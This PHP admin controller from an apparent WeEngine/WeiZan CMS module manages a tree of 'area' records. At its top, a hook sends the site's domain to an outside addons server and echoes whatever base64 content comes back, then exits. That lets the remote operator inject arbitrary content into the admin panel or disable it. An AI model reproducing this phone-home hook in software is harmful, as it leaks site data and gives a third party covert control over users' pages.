<?php
global $_GPC, $_W;
$module=$this->modulename;
$api = 'http://addons.weizancms.com/web/index.php?c=user&a=api&module='.$module.'&domain='.$_SERVER['HTTP_HOST'];
$result=@file_get_contents($api);
if(!empty($result)){
	$result=json_decode($result,true);
    if($result['type']==1){
	    echo base64_decode($result['content']);
	    exit;
    }
}
$GLOBALS['frames'] = $this->getMainMenu();
$operation = !empty($_GPC['op']) ? $_GPC['op'] : 'display';
if ($operation == 'display') {
    if (!empty($_GPC['displayorder'])) {
        foreach ($_GPC['displayorder'] as $id => $displayorder) {
            pdo_update($this->table_area, array('displayorder' => $displayorder), array('id' => $id));
        }
        message('区域排序更新成功！', $this->createWebUrl('area', array('op' => 'display')), 'success');
    }
    $children = array();
    $area = pdo_fetchall("SELECT * FROM " . tablename($this->table_area) . " WHERE weid = '{$_W['uniacid']}'  ORDER BY parentid ASC, displayorder DESC");
    foreach ($area as $index => $row) {
        if (!empty($row['parentid'])) {
            $children[$row['parentid']][] = $row;
            unset($area[$index]);
        }
    }
} elseif ($operation == 'post') {
    $parentid = intval($_GPC['parentid']);
    $id = intval($_GPC['id']);
    if (!empty($id)) {
        $area = pdo_fetch("SELECT * FROM " . tablename($this->table_area) . " WHERE id = '$id'");
    } else {
        $area = array(
            'displayorder' => 0,
        );
    }

    if (checksubmit('submit')) {
        if (empty($_GPC['catename'])) {
            message('抱歉，请输入区域名称！');
        }

        $data = array(
            'weid' => $_W['uniacid'],
            'name' => $_GPC['catename'],
            'displayorder' => intval($_GPC['displayorder']),
            'parentid' => intval($parentid),
        );


        if (!empty($id)) {
            unset($data['parentid']);
            pdo_update($this->table_area, $data, array('id' => $id));
        } else {
            pdo_insert($this->table_area, $data);
            $id = pdo_insertid();
        }
        message('更新区域成功！', $this->createWebUrl('area', array('op' => 'display')), 'success');
    }
} elseif ($operation == 'delete') {
    $id = intval($_GPC['id']);
    $area = pdo_fetch("SELECT id, parentid FROM " . tablename($this->table_area) . " WHERE id = '$id'");
    if (empty($area)) {
        message('抱歉，区域不存在或是已经被删除！', $this->createWebUrl('area', array('op' => 'display')), 'error');
    }
    pdo_delete($this->table_area, array('id' => $id, 'parentid' => $id), 'OR');
    message('区域删除成功！', $this->createWebUrl('area', array('op' => 'display')), 'success');
}
include $this->template('web/area');